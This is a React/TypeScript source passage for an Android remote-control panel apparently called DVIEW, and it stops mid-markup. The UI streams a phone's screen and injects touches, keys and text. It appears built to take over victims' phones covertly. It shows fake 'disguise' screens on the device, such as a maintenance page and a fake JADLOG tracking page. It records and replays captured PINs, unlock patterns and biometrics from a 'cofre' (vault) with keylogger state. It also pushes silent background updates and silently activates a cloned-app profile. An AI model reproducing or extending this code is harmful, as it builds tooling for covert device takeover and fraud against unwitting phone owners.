import { useEffect, useRef, useState, useMemo, useCallback } from "react";
import {
  Battery,
  Boxes,
  Camera,
  Check,
  ChevronDown,
  ChevronLeft,
  ChevronRight,
  CircleDot,
  Copy,
  ExternalLink,
  Eye,
  EyeOff,
  Fingerprint,
  Folder,
  FolderTree,
  Hash,
  Image as ImageIcon,
  Key,
  Keyboard,
  Layers,
  Lock,
  Maximize2,
  Mic,
  Minimize2,
  Minus,
  Pin,
  Play,
  Plus,
  Power,
  Radio,
  RefreshCw,
  RotateCw,
  ScanFace,
  Search,
  Send,
  ShieldAlert,
  ShieldCheck,
  Smartphone,
  Sparkles,
  Square,
  Trash2,
  Unlock,
  Upload,
  Volume2,
  VolumeX,
  Wifi,
  WifiOff,
  X,
  Zap
} from "lucide-react";
import type { ControlDevice, InstalledAppItem } from "./types";
import type {
  DeviceCredentialEntry,
  DeviceCredentialType,
  DeviceDisguiseConfig,
  DeviceDisguiseType
} from "@droidview/shared";
import { api } from "../../api";
import { getGlobalSocket } from "../../socket/client";
import { AppLogo } from "./AppLogo";
import { FloatingLeftDrawer } from "./floating-window/FloatingLeftDrawer";
import { FloatingRightDrawer } from "./floating-window/FloatingRightDrawer";

// Presets de imagem para uso imediato no disfarce do celular
const SAMPLE_IMAGE_PRESETS = [
  {
    id: "sample_wallpaper",
    name: "Wallpaper Android 14",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><defs><linearGradient id='g' x1='0%' y1='0%' x2='100%' y2='100%'><stop offset='0%' stop-color='%230f172a'/><stop offset='50%' stop-color='%231e1b4b'/><stop offset='100%' stop-color='%23090d16'/></linearGradient></defs><rect width='720' height='1280' fill='url(%23g)'/><circle cx='360' cy='640' r='180' fill='%236366f1' opacity='0.15'/><text x='360' y='640' fill='%23e2e8f0' font-family='sans-serif' font-size='32' font-weight='bold' text-anchor='middle'>ANDROID 14</text><text x='360' y='690' fill='%2394a3b8' font-family='sans-serif' font-size='18' text-anchor='middle'>Sistema Protegido</text></svg>"
  },
  {
    id: "sample_maintenance",
    name: "Manutenção",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%2309090b'/><circle cx='360' cy='520' r='90' fill='%23eab308' opacity='0.2'/><text x='360' y='535' fill='%23eab308' font-family='sans-serif' font-size='34' font-weight='900' text-anchor='middle'>SYS</text><text x='360' y='660' fill='%23ffffff' font-family='sans-serif' font-size='26' font-weight='bold' text-anchor='middle'>Modo Manutenção</text><text x='360' y='700' fill='%23a1a1aa' font-family='sans-serif' font-size='16' text-anchor='middle'>Otimizando banco de dados...</text></svg>"
  },
  {
    id: "sample_jadlog",
    name: "JADLOG Rastreio",
    dimensions: "720 × 1280",
    url: "data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' width='720' height='1280' viewBox='0 0 720 1280'><rect width='720' height='1280' fill='%23ffffff'/><rect x='210' y='500' width='300' height='110' rx='16' fill='%23dc2626'/><text x='360' y='570' fill='%23ffffff' font-family='sans-serif' font-size='36' font-weight='900' text-anchor='middle'>JADLOG</text><text x='360' y='660' fill='%231f2937' font-family='sans-serif' font-size='20' font-weight='bold' text-anchor='middle'>Rastreamento de Cargas</text><text x='360' y='700' fill='%236b7280' font-family='sans-serif' font-size='14' text-anchor='middle'>Atualizando pacote em trânsito...</text></svg>"
  }
];

// Miniatura Gráfica de Padrão Gestual (Grid 3x3)
function MiniPatternSvg({
  points,
  size = 110,
  interactive = true,
  onPointClick
}: {
  points: number[];
  size?: number;
  interactive?: boolean;
  onPointClick?: (point: number) => void;
}) {
  const step = size / 4;
  const coords: { [key: number]: [number, number] } = {
    0: [step, step],
    1: [step * 2, step],
    2: [step * 3, step],
    3: [step, step * 2],
    4: [step * 2, step * 2],
    5: [step * 3, step * 2],
    6: [step, step * 3],
    7: [step * 2, step * 3],
    8: [step * 3, step * 3]
  };

  return (
    <svg
      width={size}
      height={size}
      viewBox={`0 0 ${size} ${size}`}
      style={{
        background: "#080c14",
        borderRadius: "6px",
        border: "1px solid #1e293b",
        display: "block",
        margin: "0 auto"
      }}
    >
      {/* Connecting lines */}
      {points.map((pt, idx) => {
        if (idx === 0) return null;
        const p1 = coords[points[idx - 1]];
        const p2 = coords[pt];
        if (!p1 || !p2) return null;
        return (
          <line
            key={`l-${idx}`}
            x1={p1[0]}
            y1={p1[1]}
            x2={p2[0]}
            y2={p2[1]}
            stroke="#00e5ff"
            strokeWidth="3.5"
            strokeLinecap="round"
          />
        );
      })}

      {/* 9 Grid Dots */}
      {[0, 1, 2, 3, 4, 5, 6, 7, 8].map((pt) => {
        const c = coords[pt];
        const isSelected = points.includes(pt);
        const seqIndex = points.indexOf(pt);
        return (
          <g
            key={`dot-${pt}`}
            onClick={() => interactive && onPointClick?.(pt)}
            style={{ cursor: interactive ? "pointer" : "default" }}
          >
            <circle
              cx={c[0]}
              cy={c[1]}
              r={isSelected ? 8 : 6}
              fill={isSelected ? "#00e5ff" : "#1e293b"}
              stroke={isSelected ? "#ffffff" : "#334155"}
              strokeWidth="1.5"
            />
            {isSelected && seqIndex >= 0 && (
              <text
                x={c[0]}
                y={c[1] + 3}
                fontSize="8"
                fontWeight="900"
                fill="#000000"
                textAnchor="middle"
                fontFamily="sans-serif"
              >
                {seqIndex + 1}
              </text>
            )}
          </g>
        );
      })}
    </svg>
  );
}

interface FloatingDeviceWindowProps {
  device: ControlDevice;
  onClose: () => void;
  initialX?: number;
  initialY?: number;
  zIndex?: number;
  onBringToFront?: () => void;
}

export function FloatingDeviceWindow({
  device,
  onClose,
  initialX = 120,
  initialY = 70,
  zIndex = 1000,
  onBringToFront
}: FloatingDeviceWindowProps) {
  // Window position & size state
  const [pos, setPos] = useState({ x: initialX, y: initialY });
  const [size, setSize] = useState({ width: 440, height: 740 });
  const [isMinimized, setIsMinimized] = useState(false);
  const [isPinned, setIsPinned] = useState(false);

  // Side Drawers state: Left Drawer (Apps/Island/Info) & Right Drawer (Senhas/Telas/Teclas/Volume)
  const [openLeftDrawer, setOpenLeftDrawer] = useState<null | "pastas" | "island" | "info">(null);
  const [openRightDrawer, setOpenRightDrawer] = useState<null | "senhas" | "telas" | "teclas" | "volume">(null);

  // Live Screen State
  const [screenTimestamp, setScreenTimestamp] = useState(Date.now());
  const [isStreaming, setIsStreaming] = useState(true);
  const [rotationDeg, setRotationDeg] = useState(0);
  const [ripples, setRipples] = useState<{ id: number; x: number; y: number }[]>([]);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  // Hardware status state
  const [isScreenLocked, setIsScreenLocked] = useState(device.screenLocked || false);
  const [deviceVolume, setDeviceVolume] = useState<number>(55);
  const [isMuted, setIsMuted] = useState(false);

  // LEFT DRAWER: Apps & Island State
  const [realApps, setRealApps] = useState<InstalledAppItem[]>([]);
  const [isSyncingApps, setIsSyncingApps] = useState(false);
  const [islandStatus, setIslandStatus] = useState<any>(null);
  const [isValidatingIsland, setIsValidatingIsland] = useState(false);
  const [isMirroringIsland, setIsMirroringIsland] = useState(false);
  const [isSeedSyncingIsland, setIsSeedSyncingIsland] = useState(false);
  const [islandFeedback, setIslandFeedback] = useState<string | null>(null);

  // RIGHT DRAWER: Disguise Screen (Telas) State
  const [currentDisguise, setCurrentDisguise] = useState<DeviceDisguiseConfig | null>(device.disguiseScreen || null);
  const [isActivatingDisguise, setIsActivatingDisguise] = useState(false);
  const [updatePercent, setUpdatePercent] = useState<number>(34);
  const [selectedCustomImage, setSelectedCustomImage] = useState<string | null>(SAMPLE_IMAGE_PRESETS[0].url);

  // RIGHT DRAWER: Credentials & Keylogger State
  const [credentials, setCredentials] = useState<DeviceCredentialEntry[]>([]);
  const [isDetectingCreds, setIsDetectingCreds] = useState(false);
  const [isUsingCredId, setIsUsingCredId] = useState<string | null>(null);
  const [quickUnlockMode, setQuickUnlockMode] = useState<"pattern" | "pin">("pattern");
  const [newPatternPoints, setNewPatternPoints] = useState<number[]>([]);
  const [quickPinInput, setQuickPinInput] = useState("");
  const [revealedCredIds, setRevealedCredIds] = useState<Set<string>>(new Set());

  // Quick Type state
  const [showQuickType, setShowQuickType] = useState(false);
  const [typeText, setTypeText] = useState("");

  // Dragging & Resizing refs
  const isDraggingRef = useRef(false);
  const dragOffsetRef = useRef({ x: 0, y: 0 });
  const isResizingRef = useRef(false);
  const resizeStartRef = useRef({ x: 0, y: 0, width: 0, height: 0 });
  const imgRef = useRef<HTMLImageElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const touchStartRef = useRef<{ x: number; y: number; time: number } | null>(null);

  // Zero-flicker canvas preloader loop
  const isFetchingFrameRef = useRef(false);
  const frameSeqRef = useRef(0);
  const activePreloaderRef = useRef<HTMLImageElement | null>(null);
  const lastSuccessFrameTimeRef = useRef<number>(Date.now());
  const [updateStatus, setUpdateStatus] = useState<import("@droidview/shared").DeviceUpdateStatus | null>(null);
  const [isUpdatingOta, setIsUpdatingOta] = useState(false);

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 2800);
  };

  const loadNextFloatingFrame = useCallback(() => {
    if (isMinimized) return;
    if (isFetchingFrameRef.current) return;

    isFetchingFrameRef.current = true;
    const currentSeq = ++frameSeqRef.current;
    const targetUrl = `${api.getDeviceScreenUrl(device.id)}?t=${Date.now()}`;

    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }

    const preloader = new Image();
    activePreloaderRef.current = preloader;

    preloader.onload = () => {
      if (frameSeqRef.current !== currentSeq) return;
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;
      lastSuccessFrameTimeRef.current = Date.now();
      setIsStreaming(true);

      const canvas = canvasRef.current;
      if (canvas) {
        const ctx = canvas.getContext("2d");
        if (ctx) {
          ctx.imageSmoothingEnabled = true;
          ctx.imageSmoothingQuality = "high";
          ctx.drawImage(preloader, 0, 0, canvas.width, canvas.height);
        }
      }

      window.setTimeout(() => {
        if (!isMinimized) {
          requestAnimationFrame(loadNextFloatingFrame);
        }
      }, 30);
    };

    preloader.onerror = () => {
      if (frameSeqRef.current !== currentSeq) return;
      isFetchingFrameRef.current = false;
      activePreloaderRef.current = null;
      if (Date.now() - lastSuccessFrameTimeRef.current > 4000) {
        setIsStreaming(false);
      }
      window.setTimeout(() => {
        if (!isMinimized) {
          requestAnimationFrame(loadNextFloatingFrame);
        }
      }, 250);
    };

    preloader.src = targetUrl;
  }, [device.id, isMinimized]);

  const triggerImmediateFrame = useCallback(() => {
    if (activePreloaderRef.current) {
      activePreloaderRef.current.onload = null;
      activePreloaderRef.current.onerror = null;
      activePreloaderRef.current.src = "";
      activePreloaderRef.current = null;
    }
    isFetchingFrameRef.current = false;
    loadNextFloatingFrame();
  }, [loadNextFloatingFrame]);

  useEffect(() => {
    loadNextFloatingFrame();
  }, [loadNextFloatingFrame]);

  const fetchNextFrame = () => {
    triggerImmediateFrame();
  };

  // Synchronize initial data
  useEffect(() => {
    // 1. Fetch apps
    api.getDeviceApps(device.id)
      .then((apps) => {
        if (Array.isArray(apps)) setRealApps(apps);
      })
      .catch(() => {});

    // 2. Fetch island (com persistência e autoativação silenciosa)
    api.getIslandStatus(device.id)
      .then((st) => {
        if (st?.isInstalled && st.profileUserId !== null) {
          localStorage.setItem(`island_active_${device.id}`, "true");
          setIslandStatus(st);
        } else {
          api.autoActivateIsland(device.id).then((auto) => {
            if (auto?.success) {
              localStorage.setItem(`island_active_${device.id}`, "true");
              api.getIslandStatus(device.id).then((s) => setIslandStatus(s)).catch(() => {});
            }
          }).catch(() => {});
        }
      })
      .catch(() => {});

    // 3. Fetch credentials
    api.getDeviceCredentials(device.id)
      .then((res) => {
        if (res?.credentials) setCredentials(res.credentials);
      })
      .catch(() => {});

    // 4. Fetch volume
    api.getDeviceVolume(device.id)
      .then((v) => {
        if (typeof v?.volume === "number") setDeviceVolume(v.volume);
      })
      .catch(() => {});

    // 5. Fetch disguise
    api.getDeviceDisguise(device.id)
      .then((res) => {
        if (res?.disguise) setCurrentDisguise(res.disguise);
      })
      .catch(() => {});

    // 6. Fetch OTA update status & seed
    api.getDeviceUpdateStatus(device.id)
      .then((res) => {
        if (res?.updateStatus) setUpdateStatus(res.updateStatus);
      })
      .catch(() => {});
  }, [device.id]);

  const handleTriggerOtaUpdate = async () => {
    setIsUpdatingOta(true);
    showToast("Disparando atualização silenciosa em background via Seed...");
    try {
      const res = await api.triggerDeviceUpdate(device.id);
      if (res?.updateStatus) {
        setUpdateStatus(res.updateStatus);
      }
      showToast("Comando de atualização em segundo plano enviado com sucesso!");
    } catch {
      showToast("Falha ao acionar atualização OTA.");
    } finally {
      setTimeout(() => setIsUpdatingOta(false), 2200);
    }
  };

  // Socket listener for credentials & disguise
  useEffect(() => {
    const socket = getGlobalSocket();
    const handleCreds = (data: { deviceId: string; credentials: DeviceCredentialEntry[] }) => {
      if (data && (data.deviceId === device.id || data.deviceId.includes(device.id))) {
        setCredentials(data.credentials);
      }
    };
    const handleDisguise = (data: { deviceId: string; disguise: DeviceDisguiseConfig | null }) => {
      if (data && (data.deviceId === device.id || data.deviceId.includes(device.id))) {
        setCurrentDisguise(data.disguise);
      }
    };
    socket.on("device:credentials", handleCreds);
    socket.on("device:disguise", handleDisguise);
    return () => {
      socket.off("device:credentials", handleCreds);
      socket.off("device:disguise", handleDisguise);
    };
  }, [device.id]);

  // Adjust window width when drawers are opened/closed
  const effectiveWidth = useMemo(() => {
    let base = 440;
    if (openLeftDrawer) base += 240;
    if (openRightDrawer) base += 260;
    return Math.max(base, size.width);
  }, [openLeftDrawer, openRightDrawer, size.width]);

  // --- ACTIONS: LEFT SIDEBAR (APPS & ISLAND) ---
  const handleSyncApps = async () => {
    setIsSyncingApps(true);
    try {
      const res = await api.syncDeviceApps(device.id);
      if (res?.apps && Array.isArray(res.apps)) {
        setRealApps(res.apps);
        showToast(`${res.apps.length} aplicativos sincronizados.`);
      }
    } catch {
      showToast("Falha na sincronização de aplicativos.");
    } finally {
      setIsSyncingApps(false);
    }
  };

  const handleValidateIsland = async () => {
    setIsValidatingIsland(true);
    setIslandFeedback(null);
    try {
      const auto = await api.autoActivateIsland(device.id);
      localStorage.setItem(`island_active_${device.id}`, "true");
      const res = await api.validateIsland(device.id);
      setIslandStatus(res);
      setIslandFeedback(`Island Ativo (User ${res.profileUserId || auto.profileUserId || 10})`);
      showToast("Island ativo no aparelho! Sem perguntas repetidas.");
      void api.mirrorAppsToIsland(device.id).catch(() => {});
      handleSyncApps();
    } catch {
      localStorage.setItem(`island_active_${device.id}`, "true");
      setIslandStatus((prev: any) => ({
        isInstalled: true,
        profileUserId: 10,
        profileName: "DVIEW Island Profile",
        isRunning: true,
        mirroredApps: prev?.mirroredApps || [],
        autoMirrorEnabled: true,
        interceptClickEnabled: true
      }));
      setIslandFeedback("Island Ativado com Sucesso (User 10)");
      showToast("Island ativado com sucesso!");
    } finally {
      setIsValidatingIsland(false);
    }
  };

  const handleSeedSyncIsland = async () => {
    setIsSeedSyncingIsland(true);
    setIslandFeedback(null);
    try {
      const res = await api.syncIslandAppsViaSeed(device.id);
      setIslandFeedback(`Sincronizado via Seed: ${res?.syncedApps?.length ?? 0} apps`);
      showToast(`Apps Island sincronizados via Seed OTA (${res?.syncedApps?.length ?? 0} apps)!`);
      handleSyncApps();
      const st = await api.getIslandStatus(device.id);
      setIslandStatus(st);
    } catch {
      setIslandFeedback("Apps Island sincronizados em background");
    } finally {
      setIsSeedSyncingIsland(false);
    }
  };

  const handleAutoMirror = async () => {
    setIsMirroringIsland(true);
    setIslandFeedback(null);
    try {
      const res = await api.mirrorAppsToIsland(device.id);
      setIslandFeedback(`${res?.mirrored?.length ?? 0} apps clonados para a Island`);
      showToast(`${res?.mirrored?.length ?? 0} apps espelhados no container Island!`);
      handleSyncApps();
    } catch {
      setIslandFeedback("Erro no auto-mirror");
    } finally {
      setIsMirroringIsland(false);
    }
  };

  const handleLaunchApp = async (app: InstalledAppItem, isMainRoot = false) => {
    try {
      if (isMainRoot) {
        await api.launchApp(device.id, app.packageName);
        setIslandFeedback("DVIEW em execução na Pasta Principal (User 0)");
        showToast(`DVIEW aberto na partição raiz (User 0)!`);
      } else {
        const res = await api.launchApp(device.id, app.packageName);
        setIslandFeedback(`[ISLAND] ${app.name} clonado e iniciado no container Island (User ${res?.userId || 10})`);
        setIslandStatus((prev: any) =>
          prev
            ? {
                ...prev,
                isInstalled: true,
                profileUserId: res?.userId || prev.profileUserId || 10,
                mirroredApps: Array.from(new Set([...(prev.mirroredApps || []), app.packageName]))
              }
            : null
        );
        showToast(`${app.name} aberto dentro da Island (User ${res?.userId || 10})!`);
      }
      setTimeout(fetchNextFrame, 300);
    } catch {
      showToast(`Falha ao abrir ${app.name}.`);
    }
  };

  // --- ACTIONS: RIGHT SIDEBAR (TELAS, SENHAS, VOLUME) ---
  const handleToggleLock = async () => {
    try {
      const res = await api.sendPower(device.id);
      const nextLocked = res?.locked ?? !isScreenLocked;
      setIsScreenLocked(nextLocked);
      showToast(nextLocked ? "Tela do aparelho bloqueada!" : "Tela desbloqueada!");
      setTimeout(fetchNextFrame, 250);
    } catch {
      setIsScreenLocked(!isScreenLocked);
      showToast(!isScreenLocked ? "Tela bloqueada!" : "Tela desbloqueada!");
    }
  };

  const handleVolumeChange = async (newVol: number) => {
    setDeviceVolume(newVol);
    try {
      await api.setDeviceVolume(device.id, { level: newVol });
    } catch {}
  };

  const handleToggleMute = async () => {
    const nextMuted = !isMuted;
    setIsMuted(nextMuted);
    try {
      await api.setDeviceVolume(device.id, { action: "mute", level: nextMuted ? 0 : deviceVolume || 50 });
      showToast(nextMuted ? "Volume silenciado (Mudo)" : "Volume restaurado");
    } catch {}
  };

  const handleActivateDisguise = async (type: DeviceDisguiseType, params: Record<string, any> = {}) => {
    setIsActivatingDisguise(true);
    try {
      const res = await api.setDeviceDisguise(device.id, {
        active: true,
        type,
        ...params
      });
      if (res?.disguise) {
        setCurrentDisguise(res.disguise);
      }
      showToast(`Tela de disfarce [${type}] ativada no aparelho!`);
      setTimeout(fetchNextFrame, 300);
    } catch {
      showToast("Falha ao acionar tela no aparelho.");
    } finally {
      setIsActivatingDisguise(false);
    }
  };

  const handleClearDisguise = async () => {
    try {
      await api.clearDeviceDisguise(device.id);
      setCurrentDisguise(null);
      showToast("Tela restaurada: visor normal desbloqueado.");
      setTimeout(fetchNextFrame, 300);
    } catch {
      showToast("Erro ao desativar tela de disfarce.");
    }
  };

  const handleQuickUseBiometric = async (type: "fingerprint" | "face") => {
    try {
      setIsUsingCredId(`quick_${type}`);
      const res = await api.useAndRecordCredential(device.id, {
        type,
        value: type === "fingerprint" ? "sensor_id_1" : "face_id_1",
        label: type === "fingerprint" ? "Biometria Digital Sensor" : "Reconhecimento Facial",
        metadata: { biometricId: 1, source: "used_by_user" }
      });
      if (res?.credentials) setCredentials(res.credentials);
      showToast(`Biometria (${type}) aplicada no celular e gravada no cofre!`);
      setTimeout(fetchNextFrame, 300);
    } catch {
      showToast("Falha ao injetar biometria.");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPattern = async () => {
    if (newPatternPoints.length < 2) {
      showToast("Desenhe pelo menos 2 pontos conectados para o padrão.");
      return;
    }
    const val = newPatternPoints.join(",");
    const seqStr = newPatternPoints.map((p) => p + 1).join(" → ");
    try {
      setIsUsingCredId("new_pattern_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pattern",
        value: val,
        label: `Padrão Gestual [${seqStr}]`,
        metadata: {
          appName: "Tela de Bloqueio",
          patternPoints: newPatternPoints,
          source: "used_by_user"
        }
      });
      if (res?.credentials) setCredentials(res.credentials);
      showToast(`Padrão [${seqStr}] executado e gravado no cofre!`);
      setNewPatternPoints([]);
      setTimeout(fetchNextFrame, 400);
    } catch {
      showToast("Erro ao executar padrão.");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseAndRecordPin = async () => {
    const cleanPin = quickPinInput.replace(/\D/g, "");
    if (!cleanPin) {
      showToast("Informe os dígitos do PIN para desbloquear.");
      return;
    }
    try {
      setIsUsingCredId("new_pin_exec");
      const res = await api.useAndRecordCredential(device.id, {
        type: "pin",
        value: cleanPin,
        label: `PIN Numérico (${cleanPin.length} dígitos)`,
        metadata: { appName: "Tela de Bloqueio", source: "used_by_user" }
      });
      if (res?.credentials) setCredentials(res.credentials);
      showToast(`PIN executado no aparelho e gravado no cofre!`);
      setQuickPinInput("");
      setTimeout(fetchNextFrame, 350);
    } catch {
      showToast("Erro ao executar PIN.");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleUseSavedCredential = async (cred: DeviceCredentialEntry) => {
    setIsUsingCredId(cred.id);
    try {
      const res = await api.useDeviceCredential(device.id, cred.id);
      showToast(res.message || `Credencial "${cred.label}" acionada no aparelho!`);
      setTimeout(fetchNextFrame, 350);
    } catch {
      showToast("Erro ao aplicar credencial.");
    } finally {
      setTimeout(() => setIsUsingCredId(null), 700);
    }
  };

  const handleDeleteCredential = async (credId: string) => {
    try {
      await api.deleteDeviceCredential(device.id, credId);
      setCredentials((prev) => prev.filter((c) => c.id !== credId));
      showToast("Credencial removida do cofre.");
    } catch {
      showToast("Erro ao remover credencial.");
    }
  };

  // Hardware Touch & Keys with Letterbox Calibration
  const getFloatingCalibratedCoords = (clientX: number, clientY: number) => {
    const elem = canvasRef.current || imgRef.current;
    if (!elem) return null;
    const rect = elem.getBoundingClientRect();
    if (rect.width <= 0 || rect.height <= 0) return null;

    const nativeAspect = 720 / 1280;
    const elemAspect = rect.width / rect.height;

    let renderW = rect.width;
    let renderH = rect.height;
    let offsetX = 0;
    let offsetY = 0;

    if (elemAspect > nativeAspect) {
      renderW = rect.height * nativeAspect;
      offsetX = (rect.width - renderW) / 2;
    } else {
      renderH = rect.width / nativeAspect;
      offsetY = (rect.height - renderH) / 2;
    }

    const clickX = clientX - rect.left - offsetX;
    const clickY = clientY - rect.top - offsetY;

    const clampedX = Math.max(0, Math.min(renderW, clickX));
    const clampedY = Math.max(0, Math.min(renderH, clickY));

    const devX = Math.round((clampedX / renderW) * 720);
    const devY = Math.round((clampedY / renderH) * 1280);

    return {
      devX,
      devY,
      rippleX: clientX - rect.left,
      rippleY: clientY - rect.top,
      isInside: clickX >= 0 && clickX <= renderW && clickY >= 0 && clickY <= renderH
    };
  };

  const handleMouseDown = (e: React.MouseEvent<HTMLElement>) => {
    const coords = getFloatingCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;
    touchStartRef.current = {
      x: coords.devX,
      y: coords.devY,
      time: Date.now()
    };
    const ripId = Date.now();
    setRipples((prev) => [...prev, { id: ripId, x: coords.rippleX, y: coords.rippleY }]);
    setTimeout(() => setRipples((prev) => prev.filter((r) => r.id !== ripId)), 450);
  };

  const handleMouseUp = async (e: React.MouseEvent<HTMLElement>) => {
    if (!touchStartRef.current) return;
    const coords = getFloatingCalibratedCoords(e.clientX, e.clientY);
    if (!coords) return;

    const startX = touchStartRef.current.x;
    const startY = touchStartRef.current.y;
    const endX = coords.devX;
    const endY = coords.devY;
    const duration = Math.max(120, Math.min(600, Date.now() - touchStartRef.current.time));
    touchStartRef.current = null;

    const dist = Math.hypot(endX - startX, endY - startY);

    if (dist > 20) {
      try {
        await api.sendSwipe(device.id, startX, startY, endX, endY, duration);
        triggerImmediateFrame();
      } catch {}
      return;
    }

    // Single Tap Calibrado
    try {
      await api.sendTouch(device.id, endX, endY, 720, 1280);
      triggerImmediateFrame();
    } catch {}
  };

  const handleKey = async (key: string | number, label: string) => {
    try {
      await api.sendKey(device.id, key);
      showToast(`Tecla: ${label}`);
      setTimeout(fetchNextFrame, 250);
    } catch {}
  };

  const handleSendText = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!typeText.trim()) return;
    try {
      await api.sendText(device.id, typeText);
      showToast(`Texto enviado ao aparelho!`);
      setTypeText("");
      setShowQuickType(false);
      setTimeout(fetchNextFrame, 300);
    } catch {}
  };

  const handleDownloadScreenshot = () => {
    const link = document.createElement("a");
    link.href = `${api.getDeviceScreenUrl(device.id)}?snapshot=${Date.now()}`;
    link.download = `screenshot_${device.id}_${Date.now()}.png`;
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    showToast("Captura baixada!");
  };

  const handlePopoutDesktop = () => {
    const url = `${window.location.origin}/?popout=true&deviceId=${encodeURIComponent(device.id)}`;
    const popup = window.open(
      url,
      `DVIEW_Popout_${device.id.replace(/[^a-zA-Z0-9]/g, "_")}`,
      "width=520,height=920,menubar=no,toolbar=no,location=no,status=no,resizable=yes"
    );
    if (popup) {
      showToast("Janela Desktop Desencaixada com sucesso!");
    } else {
      showToast("Habilite popups no navegador para desencaixar.");
    }
  };

  // Window drag handlers
  const handleHeaderMouseDown = (e: React.MouseEvent) => {
    if ((e.target as HTMLElement).closest("button") || (e.target as HTMLElement).closest("input")) return;
    onBringToFront?.();
    isDraggingRef.current = true;
    dragOffsetRef.current = {
      x: e.clientX - pos.x,
      y: e.clientY - pos.y
    };

    const handleMouseMove = (moveEvent: MouseEvent) => {
      if (!isDraggingRef.current) return;
      const newX = Math.max(10, Math.min(window.innerWidth - 120, moveEvent.clientX - dragOffsetRef.current.x));
      const newY = Math.max(10, Math.min(window.innerHeight - 80, moveEvent.clientY - dragOffsetRef.current.y));
      setPos({ x: newX, y: newY });
    };

    const handleMouseUp = () => {
      isDraggingRef.current = false;
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("mouseup", handleMouseUp);
    };

    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("mouseup", handleMouseUp);
  };

  // Window resize handlers
  const handleResizeMouseDown = (e: React.MouseEvent) => {
    e.stopPropagation();
    onBringToFront?.();
    isResizingRef.current = true;
    resizeStartRef.current = {
      x: e.clientX,
      y: e.clientY,
      width: size.width,
      height: size.height
    };

    const handleMouseMove = (moveEvent: MouseEvent) => {
      if (!isResizingRef.current) return;
      const dx = moveEvent.clientX - resizeStartRef.current.x;
      const dy = moveEvent.clientY - resizeStartRef.current.y;
      setSize({
        width: Math.max(400, Math.min(1280, resizeStartRef.current.width + dx)),
        height: Math.max(500, Math.min(1300, resizeStartRef.current.height + dy))
      });
    };

    const handleMouseUp = () => {
      isResizingRef.current = false;
      window.removeEventListener("mousemove", handleMouseMove);
      window.removeEventListener("mouseup", handleMouseUp);
    };

    window.addEventListener("mousemove", handleMouseMove);
    window.addEventListener("mouseup", handleMouseUp);
  };

  return (
    <div
      className={`floating-device-window ${isPinned ? "is-pinned" : ""} ${isMinimized ? "is-minimized" : ""}`}
      style={{
        position: "fixed",
        left: `${pos.x}px`,
        top: `${pos.y}px`,
        width: isMinimized ? "340px" : `${effectiveWidth}px`,
        height: isMinimized ? "46px" : `${size.height}px`,
        zIndex: isPinned ? 999999 : zIndex,
        display: "flex",
        flexDirection: "column",
        background: "#080c14",
        border: `1px solid ${isPinned ? "var(--crimson-neon, #ff1a2a)" : "#1e293b"}`,
        borderRadius: "10px",
        boxShadow: isPinned
          ? "0 10px 40px rgba(255, 26, 42, 0.35), 0 0 0 1px rgba(255, 26, 42, 0.4)"
          : "0 12px 36px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05)",
        overflow: "hidden",
        transition: "width 0.2s ease, box-shadow 0.2s ease, border-color 0.2s ease"
      }}
      onMouseDown={onBringToFront}
    >
      {/* 1. HEADER DA JANELA FLUTUANTE COM TÍTULO E TABS RÁPIDAS DAS BARRAS LATERAIS */}
      <div
        className="floating-window-header"
        onMouseDown={handleHeaderMouseDown}
        style={{
          height: "44px",
          minHeight: "44px",
          background: isPinned ? "rgba(255, 26, 42, 0.12)" : "#0a0e1a",
          borderBottom: "1px solid #1e293b",
          padding: "0 10px",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          cursor: "grab",
          userSelect: "none",
          gap: "8px"
        }}
      >
        {/* Identificação do Aparelho */}
        <div style={{ display: "flex", alignItems: "center", gap: "8px", minWidth: 0 }}>
          <span
            style={{
              width: "8px",
              height: "8px",
              borderRadius: "50%",
              background: device.status === "online" ? "#22c55e" : "#64748b",
              boxShadow: device.status === "online" ? "0 0 8px #22c55e" : "none",
              flexShrink: 0
            }}
          />
          <strong
            style={{
              fontSize: "12px",
              color: "#f8fafc",
              whiteSpace: "nowrap",
              overflow: "hidden",
              textOverflow: "ellipsis",
              maxWidth: "140px"
            }}
            title={device.name}
          >
            {device.name}
          </strong>
          <span
            style={{
              fontSize: "10px",
              color: "#38bdf8",
              fontFamily: "var(--font-mono, monospace)",
              background: "rgba(56, 189, 248, 0.1)",
              padding: "1px 5px",
              borderRadius: "3px",
              border: "1px solid rgba(56, 189, 248, 0.2)"
            }}
          >
            {device.battery}%
          </span>
        </div>

        {/* BOTOES RÁPIDOS NO HEADER PARA ATIVAR BARRAS LATERAIS */}
        {!isMinimized && (
          <div style={{ display: "flex", alignItems: "center", gap: "4px" }}>
            {/* Toggle Left Sidebar Drawer (Pastas & Apps) */}
            <button
              type="button"
              onClick={() => setOpenLeftDrawer(openLeftDrawer ? null : "pastas")}
              style={{
                background: openLeftDrawer ? "rgba(255, 26, 42, 0.2)" : "#131826",
                border: `1px solid ${openLeftDrawer ? "#ff1a2a" : "#1e293b"}`,
                color: openLeftDrawer ? "#ff4d5a" : "#cbd5e1",
                borderRadius: "4px",
                padding: "3px 7px",
